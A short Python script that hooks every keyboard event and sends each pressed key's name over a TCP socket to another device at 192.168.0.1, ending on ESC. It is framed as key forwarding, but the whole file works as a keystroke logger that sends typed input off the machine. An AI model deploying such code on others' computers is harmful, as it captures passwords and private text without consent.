# Import the keyboard and socket modules
import keyboard
import socket

# Create a TCP socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the other device's IP address and port number
s.connect(("192.168.0.1", 1234))

# Define a callback function that sends the pressed key to the other device
def send_key(key):
    # Get the name of the pressed key
    key_name = key.name
    # Encode the key name as bytes
    key_bytes = key_name.encode()
    # Send the key bytes to the other device
    s.send(key_bytes)

# Hook all keyboard events and call the send_key function
keyboard.hook(send_key)

# Wait for the user to press ESC to exit
keyboard.wait("esc")

# Close the socket connection
s.close()
